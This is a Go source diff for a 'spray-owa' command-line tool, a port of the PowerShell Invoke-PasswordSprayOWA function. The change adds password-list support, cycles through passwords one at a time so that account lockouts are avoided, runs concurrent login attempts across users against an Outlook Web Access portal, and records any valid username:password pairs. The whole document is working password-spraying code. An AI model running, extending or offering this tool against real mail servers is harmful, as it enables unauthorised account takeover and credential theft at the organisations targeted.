@@ -12,81 +12,113 @@ import (
 
 func newSprayOWACmd() *cobra.Command {
 	var (
-		hostname string
-		userList string
-		password string
-		threads  int
-		outFile  string
-		outFmt   string
-		skipTLS  bool
-		delay    int
+		hostname     string
+		username     string
+		userList     string
+		password     string
+		passwordList string
+		threads      int
+		outFile      string
+		outFmt       string
+		skipTLS      bool
+		delay        int
 	)
 
 	cmd := &cobra.Command{
 		Use:   "spray-owa",
 		Short: "Password spray against OWA (Invoke-PasswordSprayOWA)",
-		Long: `Attempts to authenticate to an OWA portal using a list of usernames
-and a single password. Supports concurrent threads.
+		Long: `Attempts to authenticate to an OWA portal using one or more usernames
+and one or more passwords. Passwords are iterated sequentially (lockout-safe);
+users are threaded within each password round.
 
 Equivalent to the PowerShell Invoke-PasswordSprayOWA function.`,
 		RunE: func(cmd *cobra.Command, args []string) error {
-			users, err := readLines(userList)
-			if err != nil {
-				return fmt.Errorf("read user list: %w", err)
+			// Build user list.
+			var users []string
+			var err error
+			if userList != "" {
+				users, err = readLines(userList)
+				if err != nil {
+					return fmt.Errorf("read user list: %w", err)
+				}
+			} else if username != "" {
+				users = []string{username}
+			} else {
+				return fmt.Errorf("provide --username or --user-list")
 			}
-			fmt.Printf("[*] Loaded %d users from %s\n", len(users), userList)
-			fmt.Printf("[*] Spraying OWA at %s with password: %s\n", hostname, password)
+
+			// Build password list.
+			var passwords []string
+			if passwordList != "" {
+				passwords, err = readLines(passwordList)
+				if err != nil {
+					return fmt.Errorf("read password list: %w", err)
+				}
+			} else if password != "" {
+				passwords = []string{password}
+			} else {
+				return fmt.Errorf("provide --password or --password-list")
+			}
+
+			fmt.Printf("[*] Loaded %d user(s), %d password(s)\n", len(users), len(passwords))
+			fmt.Printf("[*] Spraying OWA at %s\n", hostname)
 			fmt.Printf("[*] Threads: %d | Delay: %dms\n", threads, delay)
 
 			type result struct {
-				user  string
-				valid bool
-				err   error
+				user     string
+				password string
+				valid    bool
+				err      error
 			}
 
-			sem := make(chan struct{}, threads)
-			resultCh := make(chan result, len(users))
-			var wg sync.WaitGroup
+			var allResults []output.SprayResult
 
-			for _, user := range users {
-				user := user
-				wg.Add(1)
-				sem <- struct{}{}
-				go func() {
-					defer wg.Done()
-					defer func() { <-sem }()
-					if delay > 0 {
-						time.Sleep(time.Duration(delay) * time.Millisecond)
-					}
-					oc, err := owaClient.NewClient(hostname, skipTLS)
-					if err != nil {
-						resultCh <- result{user, false, err}
-						return
-					}
-					ok, err := oc.TryLogin(user, password)
-					resultCh <- result{user, ok, err}
-				}()
-			}
-			wg.Wait()
-			close(resultCh)
+			for _, pwd := range passwords {
+				fmt.Printf("[*] Trying password: %s\n", pwd)
 
-			var sprayResults []output.SprayResult
-			for r := range resultCh {
-				if r.err != nil {
-					fmt.Printf("[-] %s: error: %v\n", r.user, r.err)
-				} else if r.valid {
-					fmt.Printf("[+] VALID: %s:%s\n", r.user, password)
+				sem := make(chan struct{}, threads)
+				resultCh := make(chan result, len(users))
+				var wg sync.WaitGroup
+
+				for _, user := range users {
+					user := user
+					wg.Add(1)
+					sem <- struct{}{}
+					go func() {
+						defer wg.Done()
+						defer func() { <-sem }()
+						if delay > 0 {
+							time.Sleep(time.Duration(delay) * time.Millisecond)
+						}
+						oc, err := owaClient.NewClient(hostname, skipTLS)
+						if err != nil {
+							resultCh <- result{user, pwd, false, err}
+							return
+						}
+						ok, err := oc.TryLogin(user, pwd)
+						resultCh <- result{user, pwd, ok, err}
+					}()
 				}
-				sprayResults = append(sprayResults, output.SprayResult{
-					Username: r.user,
-					Password: password,
-					Valid:    r.valid,
-				})
+				wg.Wait()
+				close(resultCh)
+
+				for r := range resultCh {
+					if r.err != nil {
+						fmt.Printf("[-] %s: error: %v\n", r.user, r.err)
+					} else if r.valid {
+						fmt.Printf("[+] VALID: %s:%s\n", r.user, r.password)
+					}
+					allResults = append(allResults, output.SprayResult{
+						Username: r.user,
+						Password: r.password,
+						Valid:    r.valid,
+					})
+				}
 			}
 
 			if outFile != "" {
 				fmt.Printf("[*] Writing results to %s\n", outFile)
-				if err := output.WriteSprayResults(outFile, output.ParseFormat(outFmt), sprayResults); err != nil {
+				if err := output.WriteSprayResults(outFile, output.ParseFormat(outFmt), allResults); err != nil {
 					return fmt.Errorf("write results: %w", err)
 				}
 			}
@@ -96,8 +128,10 @@ Equivalent to the PowerShell Invoke-PasswordSprayOWA function.`,
 
 	f := cmd.Flags()
 	f.StringVar(&hostname, "hostname", "", "OWA server hostname")
+	f.StringVar(&username, "username", "", "Single username to spray")
 	f.StringVar(&userList, "user-list", "", "File with usernames (one per line)")
-	f.StringVar(&password, "password", "", "Password to spray")
+	f.StringVar(&password, "password", "", "Single password to spray")
+	f.StringVar(&passwordList, "password-list", "", "File with passwords to spray (one per line)")
 	f.IntVar(&threads, "threads", 5, "Number of concurrent threads")
 	f.StringVar(&outFile, "output", "", "Output file path")
 	f.StringVar(&outFmt, "output-format", "txt", "Output format: csv, json, txt")
@@ -105,7 +139,5 @@ Equivalent to the PowerShell Invoke-PasswordSprayOWA function.`,
 	f.IntVar(&delay, "delay", 0, "Delay between requests per thread (milliseconds)")
 
 	_ = cmd.MarkFlagRequired("hostname")
-	_ = cmd.MarkFlagRequired("user-list")
-	_ = cmd.MarkFlagRequired("password")
 	return cmd
 }
